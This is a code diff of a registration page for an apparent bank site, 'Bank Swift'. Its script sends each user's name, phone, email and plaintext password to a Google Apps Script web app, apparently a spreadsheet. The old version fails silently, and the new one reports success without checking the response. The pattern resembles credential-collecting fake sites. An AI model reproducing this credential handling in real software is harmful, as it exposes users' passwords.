@@ -5,11 +5,8 @@
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
   <title>Register • Bank Swift</title>
   <link rel="icon" href="bank-swift.png" type="image/png" />
-  <link rel="apple-touch-icon" href="bank-swift.png" />
-  <link rel="shortcut icon" href="bank-swift.png" type="image/png" />
   <link rel="stylesheet" href="ui.css" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <script src="common.js"></script>
 </head>
 <body>
   <div class="hero-background"></div>
@@ -56,7 +53,7 @@
         </div>
         <div class="field">
           <label for="email">Email</label>
-          <input class="input-base" type="email" id="email" name="email" autocomplete="email" placeholder="you@example.com" required />
+          <input class="input-base" type="email" id="email" name="email" placeholder="you@example.com" required />
         </div>
         <div class="field">
           <label for="password">Password</label>
@@ -67,32 +64,31 @@
         </div>
         <button type="submit" class="btn-full" id="registerBtn">Create Account</button>
       </form>
-  <div class="auth-alt">Already have an account? <a href="login.html">Sign in</a></div>
+      <div class="auth-alt">Already have an account? <a href="login.html">Sign in</a></div>
     </section>
   </main>
 
   <script>
-    // Your Google Apps Script web app URL
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxznREHKJnObwEbXQ6xInlEQSsk1R82AA_YfKbyF8X0pQEPbS6TCdrECg94FVGlpL_o/exec';
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz8Xj7geeXL3pi9vGHHBqoZIouYBhG2kpC34kupp2OfJzOQRWgq6Zh-yREpeqLXx3lM7w/exec";
 
-    function showAlert(msg, type = 'error') { 
-      const el = document.getElementById('regAlert'); 
-      el.textContent = msg; 
-      el.className = `alert-auth ${type} show`; 
-    }
-    
-    function clearAlert() { 
-      const el = document.getElementById('regAlert'); 
-      el.textContent=''; 
-      el.className='alert-auth'; 
+    function showAlert(msg, type = 'error') {
+      const el = document.getElementById('regAlert');
+      el.textContent = msg;
+      el.className = `alert-auth ${type} show`;
     }
 
-    // Clear form on load
+    function clearAlert() {
+      const el = document.getElementById('regAlert');
+      el.textContent = '';
+      el.className = 'alert-auth';
+    }
+
     document.addEventListener('DOMContentLoaded', () => {
-      ['fullname','phone','email','password'].forEach(id => {
+      ['fullname', 'phone', 'email', 'password'].forEach(id => {
         const el = document.getElementById(id);
         if (el) el.value = '';
       });
+      console.log('Registration form ready');
     });
 
     document.getElementById('registerForm').addEventListener('submit', async (e) => {
@@ -107,10 +103,8 @@
       const fullname = document.getElementById('fullname').value.trim();
       const phone = document.getElementById('phone').value.trim();
       const email = document.getElementById('email').value.trim().toLowerCase();
-      const passwordInput = document.getElementById('password');
-      const password = passwordInput.value;
+      const password = document.getElementById('password').value;
 
-      // Basic validation
       if (!fullname || !email || !password) {
         showAlert('Please fill all required fields.');
         btn.disabled = false;
@@ -132,106 +126,62 @@
         return;
       }
 
-      try {
-        // Create new user record
-        const nowISO = new Date().toISOString();
-        const newUser = {
-          formType: 'Registration',
-          date: nowISO,
-          fullname: fullname,
-          email: email,
-          phone: phone,
-          password: password,
-          baseAvailable: 0,
-          totalBalance: 0
-        };
-
-        console.log('Submitting registration:', { ...newUser, password: '[HIDDEN]' });
-
-        // Submit to Google Sheets via Apps Script with timeout
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
-        
-        const response = await fetch(SCRIPT_URL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(newUser),
-          mode: 'cors',
-          signal: controller.signal
-        });
-        
-        clearTimeout(timeoutId);
-
-        console.log('Response status:', response.status, response.statusText);
-        
-        if (!response.ok) {
-          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-        }
-
-        const result = await response.json();
-        console.log('Response data:', result);
-        
-        if (!result.success) {
-          // Silent mode - log but don't show error to user
-          console.warn('Sheet submission failed:', result.message);
-        }
-        
-        // Continue to redirect regardless of API response
-
-      } catch (err) {
-        console.error('Registration error (silent):', err);
-        // Silent submission - proceed to redirect regardless of errors
-      }
-      
-      // Always redirect after 3 seconds, regardless of success/failure
-      window.__LAST_REG_ROW__ = {
+      const nowISO = new Date().toISOString();
+      const newUser = {
         formType: 'Registration',
-        date: new Date().toISOString(),
-        fullname: fullname,
-        email: email,
-        phone: phone
+        date: nowISO,
+        fullname,
+        phone,
+        email,
+        password,
+        baseAvailable: 0,
+        totalBalance: 0
       };
-      
-      // Persist email + flash for login page prefill/message
+
       try {
-        localStorage.setItem('bs-last-registered-email', email);
-        sessionStorage.setItem('bs-flash', 'Registration submitted. Please sign in with your credentials.');
-      } catch {}
-      
-      btn.textContent = 'Redirecting to login...';
-      
-      setTimeout(() => {
-        window.location.href = 'login.html';
-      }, 3000);
+        await fetch(SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(newUser)
+        });
+
+        btn.textContent = 'Success! Redirecting...';
+        sessionStorage.setItem('bs-flash', 'Registration successful! Please sign in.');
+        setTimeout(() => {
+          window.location.href = 'login.html';
+        }, 1800);
+      } catch (err) {
+        console.error('Register error:', err);
+        btn.disabled = false;
+        btn.textContent = originalText;
+        showAlert('Error saving to Google Sheets.');
+      }
     });
 
-    // Password visibility toggle
-    (function(){ 
-      const btn=document.getElementById('pwToggleRegister'); 
-      const input=document.getElementById('password'); 
-      if(!btn||!input) return; 
-      btn.addEventListener('click',()=>{ 
-        const type=input.getAttribute('type')==='password'?'text':'password'; 
-        input.setAttribute('type', type); 
-        btn.textContent= type==='password'?'Show':'Hide'; 
-        btn.setAttribute('aria-label', (type==='password'?'Show':'Hide')+ ' password'); 
-      }); 
+    (function () {
+      const btn = document.getElementById('pwToggleRegister');
+      const input = document.getElementById('password');
+      if (!btn || !input) return;
+      btn.addEventListener('click', () => {
+        const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+        input.setAttribute('type', type);
+        btn.textContent = type === 'password' ? 'Show' : 'Hide';
+        btn.setAttribute('aria-label', (type === 'password' ? 'Show' : 'Hide') + ' password');
+      });
     })();
 
-    // Particles creation
-    (function makeParticles(){ 
-      const c=document.getElementById('particles'); 
-      if(!c) return; 
-      for(let i=0;i<48;i++){ 
-        const p=document.createElement('span'); 
-        p.className='particle'; 
-        p.style.left=Math.random()*100+'%'; 
-        p.style.animationDelay=(Math.random()*16)+'s'; 
-        p.style.opacity=Math.random().toString(); 
+    (function makeParticles() {
+      const c = document.getElementById('particles');
+      if (!c) return;
+      for (let i = 0; i < 48; i++) {
+        const p = document.createElement('span');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.animationDelay = Math.random() * 16 + 's';
+        p.style.opacity = Math.random().toString();
         c.appendChild(p);
-      } 
+      }
     })();
   </script>
 </body>
